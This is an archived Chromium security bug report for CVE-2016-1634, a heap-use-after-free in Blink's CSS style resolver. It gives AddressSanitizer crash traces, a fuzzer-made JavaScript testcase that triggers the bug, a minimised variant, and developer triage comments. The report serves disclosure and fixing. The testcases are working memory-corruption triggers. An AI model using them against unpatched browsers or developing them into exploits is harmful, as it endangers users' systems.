# Security: heap-use-after-free in blink::ScopedStyleResolver::collectMatchingAuthorRules

| Field | Value |
|-------|-------|
| **Issue ID** | [40083243](https://issues.chromium.org/issues/40083243) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>CSS |
| **CVE IDs** | CVE-2016-1634 |
| **Reporter** | cl...@gmail.com |
| **Assignee** | [Deleted User] |
| **Created** | 2015-11-20 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

The following testcase crashes the latest ASAN build of chrome as follows:

==389==ERROR: AddressSanitizer: heap-use-after-free on address 0x60c00001e1d8 at pc 0x00000830425a bp 0x7fff5cc1d670 sp 0x7fff5cc1d668  

READ of size 8 at 0x60c00001e1d8 thread T0 (content\_shell)  

#0 0x8304259 in get third\_party/WebKit/Source/wtf/RefPtr.h:60:43  

#1 0x8304259 in contents third\_party/WebKit/Source/core/css/CSSStyleSheet.h:113  

#2 0x8304259 in blink::ScopedStyleResolver::collectMatchingAuthorRules(blink::ElementRuleCollector&, unsigned int) third\_party/WebKit/Source/core/css/resolver/ScopedStyleResolver.cpp:151  

#3 0x836cf65 in blink::StyleResolver::matchAuthorRules(blink::Element\*, blink::ElementRuleCollector&) third\_party/WebKit/Source/core/css/resolver/StyleResolver.cpp:397:9  

#4 0x836f270 in blink::StyleResolver::matchAllRules(blink::StyleResolverState&, blink::ElementRuleCollector&, bool) third\_party/WebKit/Source/core/css/resolver/StyleResolver.cpp:454:5  

#5 0x8372763 in blink::StyleResolver::styleForElement(blink::Element\*, blink::ComputedStyle const\*, blink::StyleSharingBehavior, blink::RuleMatchingBehavior) third\_party/WebKit/Source/core/css/resolver/StyleResolver.cpp:637:9  

#6 0x6fc8a43 in originalStyleForLayoutObject third\_party/WebKit/Source/core/dom/Element.cpp:1699:12  

#7 0x6fc8a43 in blink::Element::styleForLayoutObject() third\_party/WebKit/Source/core/dom/Element.cpp:1675  

#8 0x6fcb2e8 in blink::Element::recalcOwnStyle(blink::StyleRecalcChange) third\_party/WebKit/Source/core/dom/Element.cpp:1768:38  

#9 0x6fc9de7 in blink::Element::recalcStyle(blink::StyleRecalcChange, blink::Text\*) third\_party/WebKit/Source/core/dom/Element.cpp:1723:22  

#10 0x6e511f0 in blink::ContainerNode::recalcChildStyle(blink::StyleRecalcChange) third\_party/WebKit/Source/core/dom/ContainerNode.cpp:1323:17  

#11 0x6fca4a6 in blink::Element::recalcStyle(blink::StyleRecalcChange, blink::Text\*) third\_party/WebKit/Source/core/dom/Element.cpp:1738:13  

#12 0x6ee49d9 in blink::Document::updateStyle(blink::StyleRecalcChange) third\_party/WebKit/Source/core/dom/Document.cpp:1839:13  

#13 0x6ee1c69 in blink::Document::updateLayoutTree(blink::StyleRecalcChange) third\_party/WebKit/Source/core/dom/Document.cpp:1774:5  

#14 0x8a1bd2d in updateLayoutTreeIfNeeded third\_party/WebKit/Source/core/dom/Document.h:434:39  

#15 0x8a1bd2d in blink::FrameView::updateStyleAndLayoutIfNeededRecursive() third\_party/WebKit/Source/core/frame/FrameView.cpp:2524  

#16 0x8a1aa5c in blink::FrameView::updateLifecyclePhasesInternal(blink::FrameView::LifeCycleUpdateOption) third\_party/WebKit/Source/core/frame/FrameView.cpp:2395:5  

#17 0x90a7ded in blink::PageAnimator::updateLifecycleToCompositingCleanPlusScrolling(blink::LocalFrame&) third\_party/WebKit/Source/core/page/PageAnimator.cpp:94:5  

#18 0x528dea8 in blink::WebViewImpl::updateAllLifecyclePhases() third\_party/WebKit/Source/web/WebViewImpl.cpp:1920:5  

#19 0xd85b90d in content::RenderWidgetCompositor::UpdateLayerTreeHost() content/renderer/gpu/render\_widget\_compositor.cc:869:3  

#20 0x2e44893 in cc::ThreadProxy::BeginMainFrame(scoped\_ptr<cc::BeginMainFrameAndCommitState, base::DefaultDeleter[cc::BeginMainFrameAndCommitState](javascript:void(0);) >) cc/trees/thread\_proxy.cc:652:3  

#21 0x2e62495 in Run base/bind\_internal.h:176:12  

#22 0x2e62495 in base::internal::InvokeHelper<true, void, base::internal::RunnableAdapter<void (cc::ProxyMain::\*)(scoped\_ptr<cc::BeginMainFrameAndCommitState, base::DefaultDeleter[cc::BeginMainFrameAndCommitState](javascript:void(0);) >)>, base::internal::TypeList<base::WeakPtr[cc::ProxyMain](javascript:void(0);) const&, scoped\_ptr<cc::BeginMainFrameAndCommitState, base::DefaultDeleter[cc::BeginMainFrameAndCommitState](javascript:void(0);) > > >::MakeItSo(base::internal::RunnableAdapter<void (cc::ProxyMain::\*)(scoped\_ptr<cc::BeginMainFrameAndCommitState, base::DefaultDeleter[cc::BeginMainFrameAndCommitState](javascript:void(0);) >)>, base::WeakPtr[cc::ProxyMain](javascript:void(0);) const&, scoped\_ptr<cc::BeginMainFrameAndCommitState, base::DefaultDeleter[cc::BeginMainFrameAndCommitState](javascript:void(0);) >) base/bind\_internal.h:303  

#23 0x2e6206b in base::internal::Invoker<base::IndexSequence<0ul, 1ul>, base::internal::BindState<base::internal::RunnableAdapter<void (cc::ProxyMain::\*)(scoped\_ptr<cc::BeginMainFrameAndCommitState, base::DefaultDeleter[cc::BeginMainFrameAndCommitState](javascript:void(0);) >)>, void (cc::ProxyMain\*, scoped\_ptr<cc::BeginMainFrameAndCommitState, base::DefaultDeleter[cc::BeginMainFrameAndCommitState](javascript:void(0);) >), base::internal::TypeList<base::WeakPtr[cc::ProxyMain](javascript:void(0);), base::internal::PassedWrapper<scoped\_ptr<cc::BeginMainFrameAndCommitState, base::DefaultDeleter[cc::BeginMainFrameAndCommitState](javascript:void(0);) > > > >, base::internal::TypeList<base::internal::UnwrapTraits<base::WeakPtr[cc::ProxyMain](javascript:void(0);) >, base::internal::UnwrapTraits<base::internal::PassedWrapper<scoped\_ptr<cc::BeginMainFrameAndCommitState, base::DefaultDeleter[cc::BeginMainFrameAndCommitState](javascript:void(0);) > > > >, base::internal::InvokeHelper<true, void, base::internal::RunnableAdapter<void (cc::ProxyMain::\*)(scoped\_ptr<cc::BeginMainFrameAndCommitState, base::DefaultDeleter[cc::BeginMainFrameAndCommitState](javascript:void(0);) >)>, base::internal::TypeList<base::WeakPtr[cc::ProxyMain](javascript:void(0);) const&, scoped\_ptr<cc::BeginMainFrameAndCommitState, base::DefaultDeleter[cc::BeginMainFrameAndCommitState](javascript:void(0);) > > >, void ()>::Run(base::internal::BindStateBase\*) base/bind\_internal.h:343:12  

#24 0x82822d in Run base/callback.h:396:12  

#25 0x82822d in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask const&) base/debug/task\_annotator.cc:51  

#26 0xd287901 in scheduler::TaskQueueManager::ProcessTaskFromWorkQueue(scheduler::internal::TaskQueueImpl\*, scheduler::internal::TaskQueueImpl::Task\*) components/scheduler/base/task\_queue\_manager.cc:357:3  

#27 0xd280072 in scheduler::TaskQueueManager::DoWork(bool) components/scheduler/base/task\_queue\_manager.cc:282:13  

#28 0xd28ac00 in Run base/bind\_internal.h:176:12  

#29 0xd28ac00 in MakeItSo base/bind\_internal.h:303  

#30 0xd28ac00 in base::internal::Invoker<base::IndexSequence<0ul, 1ul>, base::internal::BindState<base::internal::RunnableAdapter<void (scheduler::TaskQueueManager::\*)(bool)>, void (scheduler::TaskQueueManager\*, bool), base::internal::TypeList<base::WeakPtr[scheduler::TaskQueueManager](javascript:void(0);), bool> >, base::internal::TypeList<base::internal::UnwrapTraits<base::WeakPtr[scheduler::TaskQueueManager](javascript:void(0);) >, base::internal::UnwrapTraits<bool> >, base::internal::InvokeHelper<true, void, base::internal::RunnableAdapter<void (scheduler::TaskQueueManager::\*)(bool)>, base::internal::TypeList<base::WeakPtr[scheduler::TaskQueueManager](javascript:void(0);) const&, bool const&> >, void ()>::Run(base::internal::BindStateBase\*) base/bind\_internal.h:343  

#31 0x82822d in Run base/callback.h:396:12  

#32 0x82822d in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask const&) base/debug/task\_annotator.cc:51  

#33 0x6b9780 in base::MessageLoop::RunTask(base::PendingTask const&) base/message\_loop/message\_loop.cc:481:3  

#34 0x6bb75b in DeferOrRunPendingTask base/message\_loop/message\_loop.cc:490:5  

#35 0x6bb75b in base::MessageLoop::DoWork() base/message\_loop/message\_loop.cc:602  

#36 0x6c6d6e in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) base/message\_loop/message\_pump\_default.cc:32:21  

#37 0x6fa04e in base::RunLoop::Run() base/run\_loop.cc:55:3  

#38 0x6b65c8 in base::MessageLoop::Run() base/message\_loop/message\_loop.cc:288:3  

#39 0xd44436c in content::RendererMain(content::MainFunctionParams const&) content/renderer/renderer\_main.cc:211:7  

#40 0x622114 in content::RunZygote(content::MainFunctionParams const&, content::ContentMainDelegate\*) content/app/content\_main\_runner.cc:302:14  

#41 0x6239f4 in content::RunNamedProcessTypeMain(std::\_\_1::basic\_string<char, std::\_\_1::char\_traits<char>, std::\_\_1::allocator<char> > const&, content::MainFunctionParams const&, content::ContentMainDelegate\*) content/app/content\_main\_runner.cc:386:12  

#42 0x625a5a in content::ContentMainRunnerImpl::Run() content/app/content\_main\_runner.cc:804:12  

#43 0x620dfb in content::ContentMain(content::ContentMainParams const&) content/app/content\_main.cc:19:15  

#44 0x4f45af in main content/shell/app/shell\_main.cc:49:10  

#45 0x7f8a6e3dca3f in \_\_libc\_start\_main /build/buildd/glibc-2.21/csu/libc-start.c:289

0x60c00001e1d8 is located 24 bytes inside of 128-byte region [0x60c00001e1c0,0x60c00001e240)  

freed by thread T0 (content\_shell) here:  

#0 0x4cbaab in \_\_interceptor\_free (/home/nils/fuzzer3/runner/asan-linux-release-359663/content\_shell+0x4cbaab)  

#1 0x1136de3d in deref third\_party/WebKit/Source/wtf/RefCounted.h:172:13  

#2 0x1136de3d in derefIfNotNull[blink::StyleSheet](javascript:void(0);) third\_party/WebKit/Source/wtf/PassRefPtr.h:55  

#3 0x1136de3d in ~RefPtr third\_party/WebKit/Source/wtf/RefPtr.h:58  

#4 0x1136de3d in blink::StyleElement::removedFrom(blink::Element\*, blink::ContainerNode\*) third\_party/WebKit/Source/core/dom/StyleElement.cpp:111  

#5 0x6e42441 in blink::ContainerNode::notifyNodeRemoved(blink::Node&) third\_party/WebKit/Source/core/dom/ContainerNode.cpp:860:9  

#6 0x6e3ca17 in blink::ContainerNode::removeChild(WTF::PassRefPtr[blink::Node](javascript:void(0);), blink::ExceptionState&) third\_party/WebKit/Source/core/dom/ContainerNode.cpp:594:9  

#7 0x6e2f146 in blink::collectChildrenAndRemoveFromOldParent(blink::Node&, WTF::Vector<WTF::RefPtr[blink::Node](javascript:void(0);), 11ul, WTF::PartitionAllocator>&, blink::ExceptionState&) third\_party/WebKit/Source/core/dom/ContainerNode.cpp:75:9  

#8 0x6e2d029 in blink::ContainerNode::appendChild(WTF::PassRefPtr[blink::Node](javascript:void(0);), blink::ExceptionState&) third\_party/WebKit/Source/core/dom/ContainerNode.cpp:735:5  

#9 0x709bc58 in blink::Node::appendChild(WTF::PassRefPtr[blink::Node](javascript:void(0);), blink::ExceptionState&) third\_party/WebKit/Source/core/dom/Node.cpp:482:16  

#10 0xb1fdae5 in appendChildMethodForMainWorld /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/gen/blink/bindings/core/v8/V8Node.cpp:715:39  

#11 0xb1fdae5 in blink::NodeV8Internal::appendChildMethodCallbackForMainWorld(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/gen/blink/bindings/core/v8/V8Node.cpp:726  

#12 0x493c936 in v8::internal::FunctionCallbackArguments::Call(void (\*)(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&)) v8/src/arguments.cc:33:3  

#13 0x3723684 in v8::internal::MaybeHandle[v8::internal::Object](javascript:void(0);) v8::internal::HandleApiCallHelper<false>(v8::internal::Isolate\*, v8::internal::(anonymous namespace)::BuiltinArguments<(v8::internal::BuiltinExtraArguments)1>&) v8/src/builtins.cc:1842:34  

#14 0x3735339 in Builtin\_implHandleApiCall v8/src/builtins.cc:1865:3  

#15 0x3735339 in v8::internal::Builtin\_HandleApiCall(int, v8::internal::Object\*\*, v8::internal::Isolate\*) v8/src/builtins.cc:1861  

#16 0x7f88f230b61a (<unknown module>)  

#17 0x7f88f233e737 (<unknown module>)  

#18 0x7f88f2337163 (<unknown module>)  

#19 0x7f88f231a8e1 (<unknown module>)  

#20 0x3c4cf4f in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate\*, bool, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);)) v8/src/execution.cc:98:13  

#21 0x3c4b6dd in v8::internal::Execution::Call(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*) v8/src/execution.cc:167:10  

#22 0x3629a62 in v8::Function::Call(v8::Local[v8::Context](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);), int, v8::Local[v8::Value](javascript:void(0);)\*) v8/src/api.cc:4401:7  

#23 0xa709e60 in blink::V8ScriptRunner::callFunction(v8::Local[v8::Function](javascript:void(0);), blink::ExecutionContext\*, v8::Local[v8::Value](javascript:void(0);), int, v8::Local[v8::Value](javascript:void(0);)\*, v8::Isolate\*) third\_party/WebKit/Source/bindings/core/v8/V8ScriptRunner.cpp:441:40  

#24 0xa5f7c5c in callFunction third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:159:40  

#25 0xa5f7c5c in blink::ScriptController::callFunction(v8::Local[v8::Function](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);), int, v8::Local[v8::Value](javascript:void(0);)\*) third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:154  

#26 0xa5f14c3 in blink::ScheduledAction::execute(blink::LocalFrame\*) third\_party/WebKit/Source/bindings/core/v8/ScheduledAction.cpp:120:9  

#27 0xa5f0bbc in blink::ScheduledAction::execute(blink::ExecutionContext\*) third\_party/WebKit/Source/bindings/core/v8/ScheduledAction.cpp:81:9  

#28 0x89a1c2e in blink::DOMTimer::fired() third\_party/WebKit/Source/core/frame/DOMTimer.cpp:148:5  

#29 0x10b1d4e1 in blink::TimerBase::runInternal() third\_party/WebKit/Source/platform/Timer.cpp:139:5  

#30 0x10b1dca7 in blink::TimerBase::CancellableTimerTask::run() third\_party/WebKit/Source/platform/Timer.h:109:17  

#31 0xd2657a0 in Run base/bind\_internal.h:157:12  

#32 0xd2657a0 in MakeItSo base/bind\_internal.h:293  

#33 0xd2657a0 in base::internal::Invoker<base::IndexSequence<0ul>, base::internal::BindState<base::internal::RunnableAdapter<void (\*)(scoped\_ptr<blink::WebTaskRunner::Task, base::DefaultDeleter[blink::WebTaskRunner::Task](javascript:void(0);) >)>, void (scoped\_ptr<blink::WebTaskRunner::Task, base::DefaultDeleter[blink::WebTaskRunner::Task](javascript:void(0);) >), base::internal::TypeList<base::internal::PassedWrapper<scoped\_ptr<blink::WebTaskRunner::Task, base::DefaultDeleter[blink::WebTaskRunner::Task](javascript:void(0);) > > > >, base::internal::TypeList<base::internal::UnwrapTraits<base::internal::PassedWrapper<scoped\_ptr<blink::WebTaskRunner::Task, base::DefaultDeleter[blink::WebTaskRunner::Task](javascript:void(0);) > > > >, base::internal::InvokeHelper<false, void, base::internal::RunnableAdapter<void (\*)(scoped\_ptr<blink::WebTaskRunner::Task, base::DefaultDeleter[blink::WebTaskRunner::Task](javascript:void(0);) >)>, base::internal::TypeList<scoped\_ptr<blink::WebTaskRunner::Task, base::DefaultDeleter[blink::WebTaskRunner::Task](javascript:void(0);) > > >, void ()>::Run(base::internal::BindStateBase\*) base/bind\_internal.h:343  

#34 0x82822d in Run base/callback.h:396:12  

#35 0x82822d in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask const&) base/debug/task\_annotator.cc:51  

#36 0xd287901 in scheduler::TaskQueueManager::ProcessTaskFromWorkQueue(scheduler::internal::TaskQueueImpl\*, scheduler::internal::TaskQueueImpl::Task\*) components/scheduler/base/task\_queue\_manager.cc:357:3  

#37 0xd280072 in scheduler::TaskQueueManager::DoWork(bool) components/scheduler/base/task\_queue\_manager.cc:282:13  

#38 0xd28ac00 in Run base/bind\_internal.h:176:12  

#39 0xd28ac00 in MakeItSo base/bind\_internal.h:303  

#40 0xd28ac00 in base::internal::Invoker<base::IndexSequence<0ul, 1ul>, base::internal::BindState<base::internal::RunnableAdapter<void (scheduler::TaskQueueManager::\*)(bool)>, void (scheduler::TaskQueueManager\*, bool), base::internal::TypeList<base::WeakPtr[scheduler::TaskQueueManager](javascript:void(0);), bool> >, base::internal::TypeList<base::internal::UnwrapTraits<base::WeakPtr[scheduler::TaskQueueManager](javascript:void(0);) >, base::internal::UnwrapTraits<bool> >, base::internal::InvokeHelper<true, void, base::internal::RunnableAdapter<void (scheduler::TaskQueueManager::\*)(bool)>, base::internal::TypeList<base::WeakPtr[scheduler::TaskQueueManager](javascript:void(0);) const&, bool const&> >, void ()>::Run(base::internal::BindStateBase\*) base/bind\_internal.h:343

previously allocated by thread T0 (content\_shell) here:  

#0 0x4cbd8b in \_\_interceptor\_malloc (/home/nils/fuzzer3/runner/asan-linux-release-359663/content\_shell+0x4cbd8b)  

#1 0x7f9adb3 in partitionAllocGenericFlags third\_party/WebKit/Source/wtf/PartitionAlloc.h:738:20  

#2 0x7f9adb3 in partitionAllocGeneric third\_party/WebKit/Source/wtf/PartitionAlloc.h:762  

#3 0x7f9adb3 in fastMalloc third\_party/WebKit/Source/wtf/Partitions.h:108  

#4 0x7f9adb3 in operator new third\_party/WebKit/Source/wtf/RefCounted.h:166  

#5 0x7f9adb3 in blink::CSSStyleSheet::createInline(blink::Node\*, blink::KURL const&, WTF::TextPosition const&, WTF::String const&) third\_party/WebKit/Source/core/css/CSSStyleSheet.cpp:113  

#6 0x71b52fe in blink::StyleEngine::parseSheet(blink::Element\*, WTF::String const&, WTF::TextPosition) third\_party/WebKit/Source/core/dom/StyleEngine.cpp:573:18  

#7 0x71b3e5e in blink::StyleEngine::createSheet(blink::Element\*, WTF::String const&, WTF::TextPosition) third\_party/WebKit/Source/core/dom/StyleEngine.cpp:552:22  

#8 0x1136f8a2 in blink::StyleElement::createSheet(blink::Element\*, WTF::String const&) third\_party/WebKit/Source/core/dom/StyleElement.cpp:199:24  

#9 0x1136d46f in process third\_party/WebKit/Source/core/dom/StyleElement.cpp:146:12  

#10 0x1136d46f in blink::StyleElement::processStyleSheet(blink::Document&, blink::Element\*) third\_party/WebKit/Source/core/dom/StyleElement.cpp:76  

#11 0x793d370 in blink::HTMLStyleElement::didNotifySubtreeInsertionsToDocument() third\_party/WebKit/Source/core/html/HTMLStyleElement.cpp:101:9  

#12 0x6e37491 in blink::ContainerNode::notifyNodeInserted(blink::Node&, blink::ContainerNode::ChildrenChangeSource) third\_party/WebKit/Source/core/dom/ContainerNode.cpp:828:13  

#13 0x6e3230d in blink::ContainerNode::updateTreeAfterInsertion(blink::Node&) third\_party/WebKit/Source/core/dom/ContainerNode.cpp:1280:5  

#14 0x6e2dbcd in blink::ContainerNode::appendChild(WTF::PassRefPtr[blink::Node](javascript:void(0);), blink::ExceptionState&) third\_party/WebKit/Source/core/dom/ContainerNode.cpp:771:9  

#15 0x709bc58 in blink::Node::appendChild(WTF::PassRefPtr[blink::Node](javascript:void(0);), blink::ExceptionState&) third\_party/WebKit/Source/core/dom/Node.cpp:482:16  

#16 0xb1fdae5 in appendChildMethodForMainWorld /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/gen/blink/bindings/core/v8/V8Node.cpp:715:39  

#17 0xb1fdae5 in blink::NodeV8Internal::appendChildMethodCallbackForMainWorld(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/gen/blink/bindings/core/v8/V8Node.cpp:726  

#18 0x493c936 in v8::internal::FunctionCallbackArguments::Call(void (\*)(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&)) v8/src/arguments.cc:33:3  

#19 0x3723684 in v8::internal::MaybeHandle[v8::internal::Object](javascript:void(0);) v8::internal::HandleApiCallHelper<false>(v8::internal::Isolate\*, v8::internal::(anonymous namespace)::BuiltinArguments<(v8::internal::BuiltinExtraArguments)1>&) v8/src/builtins.cc:1842:34  

#20 0x3735339 in Builtin\_implHandleApiCall v8/src/builtins.cc:1865:3  

#21 0x3735339 in v8::internal::Builtin\_HandleApiCall(int, v8::internal::Object\*\*, v8::internal::Isolate\*) v8/src/builtins.cc:1861  

#22 0x7f88f230b61a (<unknown module>)  

#23 0x7f88f233e6ba (<unknown module>)  

#24 0x7f88f2337163 (<unknown module>)  

#25 0x7f88f231a8e1 (<unknown module>)  

#26 0x3c4cf4f in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate\*, bool, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);)) v8/src/execution.cc:98:13  

#27 0x3c4b6dd in v8::internal::Execution::Call(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*) v8/src/execution.cc:167:10  

#28 0x3629a62 in v8::Function::Call(v8::Local[v8::Context](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);), int, v8::Local[v8::Value](javascript:void(0);)\*) v8/src/api.cc:4401:7  

#29 0xa709e60 in blink::V8ScriptRunner::callFunction(v8::Local[v8::Function](javascript:void(0);), blink::ExecutionContext\*, v8::Local[v8::Value](javascript:void(0);), int, v8::Local[v8::Value](javascript:void(0);)\*, v8::Isolate\*) third\_party/WebKit/Source/bindings/core/v8/V8ScriptRunner.cpp:441:40  

#30 0xa5f7c5c in callFunction third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:159:40  

#31 0xa5f7c5c in blink::ScriptController::callFunction(v8::Local[v8::Function](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);), int, v8::Local[v8::Value](javascript:void(0);)\*) third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:154  

#32 0xa5f14c3 in blink::ScheduledAction::execute(blink::LocalFrame\*) third\_party/WebKit/Source/bindings/core/v8/ScheduledAction.cpp:120:9  

#33 0xa5f0bbc in blink::ScheduledAction::execute(blink::ExecutionContext\*) third\_party/WebKit/Source/bindings/core/v8/ScheduledAction.cpp:81:9  

#34 0x89a1c2e in blink::DOMTimer::fired() third\_party/WebKit/Source/core/frame/DOMTimer.cpp:148:5  

#35 0x10b1d4e1 in blink::TimerBase::runInternal() third\_party/WebKit/Source/platform/Timer.cpp:139:5  

#36 0x10b1dca7 in blink::TimerBase::CancellableTimerTask::run() third\_party/WebKit/Source/platform/Timer.h:109:17  

#37 0xd2657a0 in Run base/bind\_internal.h:157:12  

#38 0xd2657a0 in MakeItSo base/bind\_internal.h:293  

#39 0xd2657a0 in base::internal::Invoker<base::IndexSequence<0ul>, base::internal::BindState<base::internal::RunnableAdapter<void (\*)(scoped\_ptr<blink::WebTaskRunner::Task, base::DefaultDeleter[blink::WebTaskRunner::Task](javascript:void(0);) >)>, void (scoped\_ptr<blink::WebTaskRunner::Task, base::DefaultDeleter[blink::WebTaskRunner::Task](javascript:void(0);) >), base::internal::TypeList<base::internal::PassedWrapper<scoped\_ptr<blink::WebTaskRunner::Task, base::DefaultDeleter[blink::WebTaskRunner::Task](javascript:void(0);) > > > >, base::internal::TypeList<base::internal::UnwrapTraits<base::internal::PassedWrapper<scoped\_ptr<blink::WebTaskRunner::Task, base::DefaultDeleter[blink::WebTaskRunner::Task](javascript:void(0);) > > > >, base::internal::InvokeHelper<false, void, base::internal::RunnableAdapter<void (\*)(scoped\_ptr<blink::WebTaskRunner::Task, base::DefaultDeleter[blink::WebTaskRunner::Task](javascript:void(0);) >)>, base::internal::TypeList<scoped\_ptr<blink::WebTaskRunner::Task, base::DefaultDeleter[blink::WebTaskRunner::Task](javascript:void(0);) > > >, void ()>::Run(base::internal::BindStateBase\*) base/bind\_internal.h:343

SUMMARY: AddressSanitizer: heap-use-after-free third\_party/WebKit/Source/wtf/RefPtr.h:60:43 in get  

Shadow bytes around the buggy address:  

0x0c187fffbbe0: 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fa  

0x0c187fffbbf0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0c187fffbc00: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd  

0x0c187fffbc10: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa  

0x0c187fffbc20: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

=>0x0c187fffbc30: fa fa fa fa fa fa fa fa fd fd fd[fd]fd fd fd fd  

0x0c187fffbc40: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa  

0x0c187fffbc50: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa  

0x0c187fffbc60: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd  

0x0c187fffbc70: fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa  

0x0c187fffbc80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Heap right redzone: fb  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack partial redzone: f4  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb  

==389==ABORTING

**VERSION**  

Chrome Version: asan-linux-release-359663  

Operating System: Linux 64-bit

**REPRODUCTION CASE**

<script>
function start() {
o0=window.document;
o3=o0.implementation.createDocument('http://www.w3.org/1999/xlink','overlay',undefined);
o5=o3.querySelector('\\*:not([id])');
o9=o0.createElementNS('http://www.w3.org/1999/xhtml','form');
o9.id='id2';
o0.documentElement.appendChild(o9);
o11=document.createElementNS('http://www.w3.org/1999/xhtml','form');
o3.documentElement.appendChild(o11);
document.documentElement.appendChild(o5);
o11.innerHTML=unescape('<style>');
delete o9;
o36=o0.createElement('menu');
o47=document.createElementNS('http://www.w3.org/1999/xhtml','input');
document.documentElement.appendChild(o36);
o54=o36['createShadowRoot'](undefined,undefined,'',undefined,-1);
o63=o0.getElementById('id2');
o54.appendChild(o63);
window.top.setTimeout(timeout\_23);
}
function timeout\_23() {
o47.innerHTML=unescape('<style>');
o72=o0.createElement('figure');
o63.appendChild(o47);
o72.appendChild(o47);
}
start();
</script>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab

## Timeline

### cl...@chromium.org (2015-11-20)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://cluster-fuzz.appspot.com/testcase?key=5696509850419200

### wf...@chromium.org (2015-11-21)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-11-21)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5696509850419200

Uploader: wfh@chromium.org
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x610000056d98
Crash State:
  blink::CSSStyleSheet::contents
  blink::ScopedStyleResolver::collectMatchingAuthorRules
  blink::StyleResolver::matchAuthorRules
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=343542:343570

Minimized Testcase (1.01 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv96WkhrnHt_RAriBgxqze_E3cU6NybTb5984zIVW8PJq-3tqcWnsvxru18Fs-Q4N5y4OHv3OUipc6JYSyr1kSkpaSicalwGOmaJ-B60J5uad4CI8neVJKpXS4eUaMAO22iYnC8pQwiXCJ415RAyOnhb8uK4dRQ
<script>
        o0=window.document;
        o3=o0.implementation.createDocument('http://www.w3.org/1999/xlink',undefined);
        o5=o3.querySelector('*:not([id])');
        o9=o0.createElementNS('http://www.w3.org/1999/xhtml','form');
        o9.id='id2';
        o0.documentElement.appendChild(o9);
        o11=document.createElementNS('http://www.w3.org/1999/xhtml','form');
        o3.documentElement.appendChild(o11);
        document.documentElement.appendChild(o5);
        o11.innerHTML=unescape('<style>');
        o36=o0.createElement('menu');
        o47=document.createElementNS('http://www.w3.org/1999/xhtml','input');
        document.documentElement.appendChild(o36);
        o54=o36['createShadowRoot']();
        o63=o0.getElementById('id2');
        o54.appendChild(o63);
        window.top.setTimeout(timeout_23);
function timeout_23() {
        o47.innerHTML=unescape('<style>');
        o72=o0.createElement('figure');
        o63.appendChild(o47);
        o72.appendChild(o47);
}
</script>


See https://dev.chromium.org/Home/chromium-security/bugs/reproducing-clusterfuzz-bugs for more information.

### cl...@chromium.org (2015-11-21)

[Empty comment from Monorail migration]

### wf...@chromium.org (2015-11-21)

suspect 3b209b513462906f3bb6c58bb2abbe7f1f90e8f1 -> esprehn@ can you take a look a this and reassign if necessary. Thanks.

### cl...@chromium.org (2015-11-21)

[Empty comment from Monorail migration]

### es...@chromium.org (2015-12-02)

Not sure, perhaps someone from the style team can debug this? Here's a simplified test case:

<style></style>
